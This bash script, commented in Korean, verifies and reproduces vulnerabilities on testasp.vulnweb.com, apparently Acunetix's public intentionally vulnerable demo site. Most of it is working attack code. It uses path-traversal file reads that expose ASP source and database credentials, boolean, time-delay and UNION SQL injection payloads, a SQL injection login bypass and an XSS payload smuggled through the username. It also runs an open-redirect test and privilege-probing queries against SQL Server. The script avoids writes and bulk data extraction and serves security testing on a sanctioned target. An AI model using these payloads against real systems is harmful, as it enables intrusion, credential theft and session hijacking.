#!/usr/bin/env bash
# verify_chain.sh — testasp.vulnweb.com 확정 취약점 재현 검증 (재현 스크립트)
#   ※ 데이터 변경 없음: 파일 생성/DB INSERT·UPDATE·DELETE/계정·글 작성 없음.
#      - 임의 DML(INSERT)은 "권한 오라클"(HAS_PERMS_BY_NAME)로만 확인한다.
#      - 자격증명은 값이 아니라 "컬럼 읽기 가능 여부" 오라클만 확인한다(대량 반출 방지).
#      - second-order 는 LFI 로 읽은 소스 조건으로만 확인한다(런타임은 쓰기가 필요).
#      - PUT 은 거부되는지(부정 재확인)만 본다 — 파일이 생성되지 않음을 함께 검증한다.
#   사용: bash verify_chain.sh
#         B=http://testasp.vulnweb.com P=http://127.0.0.1:8080 bash verify_chain.sh
#   주의: 공개 데모는 수시로 리셋되고, 앱 자체의 total>100 → DELETE 분기가 동작해 게시글이
#         사라질 수 있다 → 결과는 "실행 시각 기준"으로만 유효하다.
set -u

B="${B:-http://testasp.vulnweb.com}"
P="${P:-}"
CURL=(curl -s --max-time 30)
TL=(curl -s --max-time 45)          # 시간차 오라클 전용(사이트 부하로 지연 확대되는 경우 대비)
[ -n "$P" ] && CURL+=(-x "$P")
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
PASS=0; FAIL=0

say() { printf '\n=== %s ===\n' "$*"; }
chk() { if [ "$2" = "$3" ]; then printf '  PASS  %-56s %s\n' "$1" "$3"; PASS=$((PASS+1)); \
        else printf '  FAIL  %-56s 기대=%s 실제=%s\n' "$1" "$2" "$3"; FAIL=$((FAIL+1)); fi; }
chkhas() { if grep -qF -- "$3" "$2" 2>/dev/null; then printf '  PASS  %-56s (존재)\n' "$1"; PASS=$((PASS+1)); \
           else printf '  FAIL  %-56s (없음: %s)\n' "$1" "$3"; FAIL=$((FAIL+1)); fi; }
chkno()  { if grep -qF -- "$3" "$2" 2>/dev/null; then printf '  FAIL  %-56s (있으면 안 되는 패턴: %s)\n' "$1" "$3"; FAIL=$((FAIL+1)); \
           else printf '  PASS  %-56s (부재 확인)\n' "$1"; PASS=$((PASS+1)); fi; }

# q <path> <out> key=value...   |   qc <path> key=value...  (모두 URL 인코딩해서 GET)
q()  { local path="$1" out="$2"; shift 2; local a=(); for kv in "$@"; do a+=(--data-urlencode "$kv"); done
       "${CURL[@]}" -o "$out" -G "${a[@]}" "$B$path"; }
qc() { local path="$1"; shift; local a=(); for kv in "$@"; do a+=(--data-urlencode "$kv"); done
       "${CURL[@]}" -o /dev/null -w '%{http_code}' -G "${a[@]}" "$B$path"; }
urlcode() { "${CURL[@]}" -o /dev/null -w '%{http_code}' "$1"; }
urlsize() { "${CURL[@]}" -o /dev/null -w '%{size_download}' "$1"; }
UNION10="zzq')>0) UNION ALL SELECT 1,%s,0,0,0,0,GETDATE(),'','',''--"   # 10열 베이스

printf 'verify_chain — %s (proxy=%s)\n시작: %s\n' "$B" "${P:-none}" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# ------------------------------------------------------------ 0. 도달성 / 헤더
say "0. 도달성 / 보안 헤더"
"${CURL[@]}" -D "$TMP/h0" -o /dev/null "$B/"
grep -qi 'Server: Microsoft-IIS' "$TMP/h0" && chk "Server: Microsoft-IIS" ok ok || chk "Server: Microsoft-IIS" ok "$(tr -d '\r' <"$TMP/h0" | grep -i '^server:')"
chkhas "X-Powered-By: ASP.NET" "$TMP/h0" "X-Powered-By: ASP.NET"
for h in Content-Security-Policy X-XSS-Protection X-Frame-Options Strict-Transport-Security; do
  chk "보안 헤더 부재: $h" 0 "$(grep -ci "^$h:" "$TMP/h0")"; done

# ------------------------------------------------------------ 1. LFI #1
say "1. LFI #1 — Templatize.asp?item= (웹루트 밖 임의 파일 읽기)"
chk "대조군 item=html/about.html = 200" 200 "$(urlcode "$B/Templatize.asp?item=html/about.html")"
chk "item=../../../../windows/win.ini = 200" 200 "$(urlcode "$B/Templatize.asp?item=../../../../windows/win.ini")"
q "/Templatize.asp" "$TMP/winini" "item=../../../../windows/win.ini"
chkhas "win.ini 본문에 [fonts]" "$TMP/winini" "[fonts]"
chk "item=../../../../windows/system.ini = 200" 200 "$(urlcode "$B/Templatize.asp?item=../../../../windows/system.ini")"
chk "item=../../../../windows/system32/drivers/etc/hosts = 200" 200 "$(urlcode "$B/Templatize.asp?item=../../../../windows/system32/drivers/etc/hosts")"
chk "부재 파일(부정 재확인) global.asa = 500" 500 "$(urlcode "$B/Templatize.asp?item=global.asa")"

# ------------------------------------------------------------ 2. LFI #2
say "2. LFI #2 — shownews.asp?item= (미링크 orphan, 두 번째 인스턴스)"
chk "shownews.asp?item=win.ini = 200" 200 "$(urlcode "$B/shownews.asp?item=../../../../windows/win.ini")"
q "/shownews.asp" "$TMP/sn" "item=../../../../windows/win.ini"
chkhas "raw 파일 내용 반환([fonts])" "$TMP/sn" "[fonts]"
chkno  "템플릿 래퍼 없음(InstanceBegin 부재)" "$TMP/sn" "InstanceBegin template"
chk "무파라미터(부정) = 500" 500 "$(urlcode "$B/shownews.asp")"

# ------------------------------------------------------------ 3. 소스 유출
say "3. ASP 소스 평문 유출 (화이트박스 근거)"
chk "item=db.asp = 200" 200 "$(urlcode "$B/Templatize.asp?item=db.asp")"
q "/Templatize.asp" "$TMP/db" "item=db.asp"
chkhas "db.asp 에 접속문자열(Provider=SQLNCLI11)" "$TMP/db" "Provider=SQLNCLI11"
chkhas "db.asp 에 DB 자격증명(Uid=acunetix)" "$TMP/db" "Uid=acunetix"
q "/Templatize.asp" "$TMP/login_src" "item=Login.asp"
chkhas "Login.asp 소스에 문자열 결합 SQL" "$TMP/login_src" "SELECT uname, upass FROM users WHERE uname='"

# ------------------------------------------------------------ 4. FrontPage 메타데이터
say "4. FrontPage 메타데이터 노출 (/_vti_cnf/)"
chk "/_vti_cnf/Default.asp = 200" 200 "$(urlcode "$B/_vti_cnf/Default.asp")"
q "/_vti_cnf/Default.asp" "$TMP/meta"
chkhas "vti_backlinkinfo 노출" "$TMP/meta" "vti_backlinkinfo"
chkhas "vti_extenderversion 노출" "$TMP/meta" "vti_extenderversion"
chk "/_vti_pvt/service.pwd 부재" 404 "$(urlcode "$B/_vti_pvt/service.pwd")"
if [ "$(urlcode "$B/Templates/MainTemplate.dwt.asp")" = 200 ] && [ "$(urlcode "$B/Templates/_vti_cnf/")" = 404 ]; then
  chk "caveat: 실존 파일인데 _vti_cnf 404 (absence 오라클 부적합)" ok ok
else chk "caveat: 실존 파일인데 _vti_cnf 404 (absence 오라클 부적합)" ok not-reproduced; fi

# ------------------------------------------------------------ 5~6. showforum SQLi
say "5. SQLi — showforum.asp?id= (boolean 오라클)"
chk "id=1 정상 = 200" 200 "$(qc "/showforum.asp" "id=1")"
chk "id=1 AND 1=1 (참) = 200" 200 "$(qc "/showforum.asp" "id=1 AND 1=1")"
chk "id=1 AND 1=2 (거짓) = 500" 500 "$(qc "/showforum.asp" "id=1 AND 1=2")"

say "6. SQLi — showforum.asp?id= (스택드 시간차 오라클, 지연만 사용)"
T1=$("${TL[@]}" -o /dev/null -w '%{time_total}' -G --data-urlencode "id=0;IF 1=1 WAITFOR DELAY '0:0:02'--" "$B/showforum.asp")
T2=$("${TL[@]}" -o /dev/null -w '%{time_total}' -G --data-urlencode "id=0;IF 1=2 WAITFOR DELAY '0:0:02'--" "$B/showforum.asp")
printf '        참조건 %.2fs / 거짓조건 %.2fs  (참조건이 45s 근처면 = 사이트 부하로 지연 확대, 비율 판정은 동일)\n' "$T1" "$T2"
if awk "BEGIN{exit !($T1>=1.5 && $T2<1.2)}"; then chk "지연 오라클 성립(참조건만 2초 지연)" ok ok; else chk "지연 오라클 성립(참조건만 2초 지연)" ok "T1=$T1 T2=$T2"; fi

# ------------------------------------------------------------ 7~8. Search.asp SQLi
say "7. SQLi — Search.asp?tfSearch= (UNION 10열 = 1요청 열람)"
q "/Search.asp" "$TMP/union" "tfSearch=$(printf "$UNION10" "'ACUVERIFY='+DB_NAME()")"
chkhas "UNION 으로 DB_NAME() 렌더" "$TMP/union" "ACUVERIFY=acuforum"
q "/Search.asp" "$TMP/unionver" "tfSearch=zzq')>0) UNION ALL SELECT 1,'VER='+LEFT(@@version,28),0,0,0,0,GETDATE(),'','',''--"
chkhas "UNION 으로 @@version 렌더" "$TMP/unionver" "VER=Microsoft SQL Server 2014"
chk "9열(열수 불일치) = 500" 500 "$(qc "/Search.asp" "tfSearch=zzq')>0) UNION ALL SELECT 1,2,3,4,5,6,7,8,9--")"
chk "showforum UNION 불가(열수 공유, 부정) = 500" 500 "$(qc "/showforum.asp" "id=0 UNION SELECT 'A','B'--")"
chk "showthread UNION 불가(부정) = 500" 500 "$(qc "/showthread.asp" "id=0 UNION SELECT 'A','B','C','D'--")"

say "8. 부정 — 오류 기반 SQLi 불가 / 상태코드 맹점"
chk "문법오류 = 500 (IIS 기본 페이지)" 500 "$(qc "/Search.asp" "tfSearch=zzq')>0)")"
chk "문법오류 응답 크기 = 1208 (SQL 오류문 미노출)" 1208 "$(urlsize "$B/Search.asp?tfSearch=zzq%27%29%3E0%29")"

# ------------------------------------------------------------ 9~11. 인증 / 세션
say "9. 인증우회 — POST Login.asp (SQLi)"
BY="admin'--"
"${CURL[@]}" -o /dev/null -D "$TMP/hb" -c "$TMP/cb" -X POST --data-urlencode "tfUName=$BY" --data-urlencode "tfUPass=x" "$B/Login.asp"
chk "우회 로그인 = 302" 302 "$(awk 'NR==1{print $2}' "$TMP/hb")"
chkhas "Location: Default.asp" "$TMP/hb" "Location: Default.asp"
chkhas "세션 쿠키(ASPSESSIONID) 발급" "$TMP/cb" "ASPSESSIONID"
chk "대조군: 없는 계정 = 200(로그인 실패)" 200 "$("${CURL[@]}" -o /dev/null -w '%{http_code}' -X POST --data-urlencode "tfUName=nosuchuser_zz" --data-urlencode "tfUPass=x" "$B/Login.asp")"

say "10. 인증 전용 폼 개방 (읽기 전용 관찰)"
"${CURL[@]}" -b "$TMP/cb" -o "$TMP/authed" "$B/showforum.asp?id=1"
"${CURL[@]}" -o "$TMP/anon" "$B/showforum.asp?id=1"
a=$(grep -c 'tfSubject' "$TMP/authed" || true); n=$(grep -c 'tfSubject' "$TMP/anon" || true)
if [ "$a" -ge 1 ] && [ "$n" -eq 0 ]; then chk "게시 폼은 세션 보유 시에만 노출" ok ok; else chk "게시 폼은 세션 보유 시에만 노출" ok "auth=$a anon=$n"; fi

say "11. open redirect — RetURL (허용목록 검증 전무)"
"${CURL[@]}" -o /dev/null -D "$TMP/hr" -X POST --data-urlencode "tfUName=$BY" --data-urlencode "tfUPass=x" "$B/Login.asp?RetURL=http://example.com/"
chkhas "우회 로그인 + RetURL → Location: http://example.com/" "$TMP/hr" "Location: http://example.com/"
"${CURL[@]}" -o /dev/null -D "$TMP/hl" "$B/Logout.asp?RetURL=http://example.com/"
chk "무인증 GET Logout.asp?RetURL= = 302" 302 "$(awk 'NR==1{print $2}' "$TMP/hl")"
chkhas "Logout Location 값도 그대로 반영" "$TMP/hl" "Location: http://example.com/"

# ------------------------------------------------------------ 12~13. XSS (쓰기 없이)
say "12. XSS — 쓰기 없는 확인 (세션명 무이스케이프 렌더 + 보안 헤더 부재)"
# Login.asp 는 Session.Contents("uname") = Request.Form("tfUName") 로 '입력 원문'을 세션에 넣고,
# 각 페이지가 그 값을 Server.HTMLEncode 없이 Response.Write 한다 → 게시 없이(쓰기 없이) XSS 실증 가능.
# 단 로그인 판정이 'rs.EOF 아님'이므로, 페이로드가 실제 행을 반환하도록 AND 조건을 덧붙여야 한다.
XS="admin' AND '<img src=x onerror=alert(1)>'='<img src=x onerror=alert(1)>'--"
chk "HTML 페이로드 로그인 = 302 (행 반환 조건 결합)" 302 "$("${CURL[@]}" -o /dev/null -w '%{http_code}' -X POST --data-urlencode "tfUName=$XS" --data-urlencode "tfUPass=x" "$B/Login.asp")"
"${CURL[@]}" -o /dev/null -c "$TMP/cx" -X POST --data-urlencode "tfUName=$XS" --data-urlencode "tfUPass=x" "$B/Login.asp"
"${CURL[@]}" -b "$TMP/cx" -o "$TMP/menu" "$B/Default.asp"
chkhas "세션 uname 이 인코딩 없이 렌더(반사 XSS)" "$TMP/menu" "onerror=alert(1)"
chkno  "HTML 인코딩 흔적(&lt;img) 부재 = 원문 출력" "$TMP/menu" "&lt;img"
q "/Templatize.asp" "$TMP/login2" "item=Login.asp"
chkhas "Login.asp: 세션 uname = 입력 원문(검증·이스케이프 없음)" "$TMP/login2" 'Session.Contents("uname") = Request.Form("tfUName")'
q "/Templatize.asp" "$TMP/def2" "item=Default.asp"
chkhas "Default.asp: 로그아웃 메뉴에 세션명 무이스케이프 출력" "$TMP/def2" '">logout " & Session.Contents("uname")'
chk "CSP 헤더 없음(저장형 XSS 실행 가능)" 0 "$("${CURL[@]}" -D - -o /dev/null "$B/showthread.asp?id=1" | grep -ci '^content-security-policy')"

say "13. second-order — 소스 조건만 확인(런타임 확인에는 쓰기 필요)"
q "/Templatize.asp" "$TMP/st" "item=showthread.asp"
chkhas 'INSERT posts 에 Session.Contents("uname") 무이스케이프 결합' "$TMP/st" 'Session.Contents("uname")'
chkhas "tfSubject/tfText 는 따옴표만 이스케이프(HTML 인코딩 없음)" "$TMP/st" "Replace(Request.Form(\"tfText\"), \"'\", \"''\", 1, -1, 1)"

# ------------------------------------------------------------ 14~15. 권한/DML/자격증명
say "14. RCE 상한 + 임의 DML 권한 (실행 없는 오라클)"
q "/Search.asp" "$TMP/perm" "tfSearch=zzq')>0) UNION ALL SELECT 1,'SYSADMIN='+ISNULL(CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar),'N'),'XPCMD='+ISNULL(CAST((SELECT TOP 1 value_in_use FROM sys.configurations WHERE name='xp_cmdshell') AS varchar),'N'),'',0,0,GETDATE(),'CTRL='+ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER') AS varchar),'N'),'UPDacu='+ISNULL(CAST(HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','UPDATE') AS varchar),'N'),'UPDacublog='+ISNULL(CAST(HAS_PERMS_BY_NAME('acublog.dbo.users','OBJECT','UPDATE') AS varchar),'N')--"
chkhas "sysadmin=0 (RCE 배제)" "$TMP/perm" "SYSADMIN=0"
chkhas "xp_cmdshell 비활성(=0)" "$TMP/perm" "XPCMD=0"
chkhas "CONTROL SERVER=0" "$TMP/perm" "CTRL=0"
chkhas "임의 DML 권한 존재(acuforum.users UPDATE=1)" "$TMP/perm" "UPDacu=1"
chkhas "교차DB 쓰기 권한(acublog.users UPDATE=1)" "$TMP/perm" "UPDacublog=1"

say "15. 민감 데이터 — 값이 아니라 '읽기 가능' 오라클"
q "/Search.asp" "$TMP/cred" "tfSearch=zzq')>0) UNION ALL SELECT 1,'CRED_COL_READABLE='+CAST(CASE WHEN EXISTS(SELECT 1 FROM users WHERE upass IS NOT NULL) THEN 1 ELSE 0 END AS varchar),'USERS_ROWS='+CAST((SELECT COUNT(*) FROM users) AS varchar),'',0,0,GETDATE(),'POSTS_ROWS='+CAST((SELECT COUNT(*) FROM posts) AS varchar),'',''--"
chkhas "upass 컬럼 읽기 가능(평문 자격증명 접근)" "$TMP/cred" "CRED_COL_READABLE=1"
printf '        참고(변동값): %s\n' "$(grep -o -E '(USERS_ROWS|POSTS_ROWS)=[0-9]+' "$TMP/cred" | sort -u | tr '\n' ' ')"

# ------------------------------------------------------------ 16. 부정 재확인
say "16. 부정 재확인 (재탐색 불필요)"
chk "/admin = 404" 404 "$(urlcode "$B/admin")"
chk "/web.config = 404" 404 "$(urlcode "$B/web.config")"
chk "/global.asa = 404" 404 "$(urlcode "$B/global.asa")"
chk "IIS 8.3 단축명(defaul~1.asp) = 404" 404 "$(urlcode "$B/defaul~1.asp")"
chk "TRACE = 501" 501 "$("${CURL[@]}" -o /dev/null -w '%{http_code}' -X TRACE "$B/")"
PUTCODE=$("${CURL[@]}" -o /dev/null -w '%{http_code}' -X PUT --data 'x' "$B/acu_verify_probe.txt")
if [ "$PUTCODE" = 404 ] || [ "$PUTCODE" = 405 ]; then chk "PUT 업로드 거부(404/405)" ok ok; else chk "PUT 업로드 거부(404/405)" ok "PUT=$PUTCODE"; fi
chk "PUT 대상 파일 미생성(GET 404)" 404 "$(urlcode "$B/acu_verify_probe.txt")"

# ------------------------------------------------------------ 요약
printf '\n=================================================\n'
printf '결과: PASS=%d  FAIL=%d\n' "$PASS" "$FAIL"
printf '데이터 변경 0건 (계정·글·파일 생성 없음 / 거부되는 PUT 시도 1건, 파일 미생성 확인)\n'
printf '실행 시각 %s — 이 데모는 수시 리셋되므로 이 시각 기준으로만 유효\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
printf '=================================================\n'
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
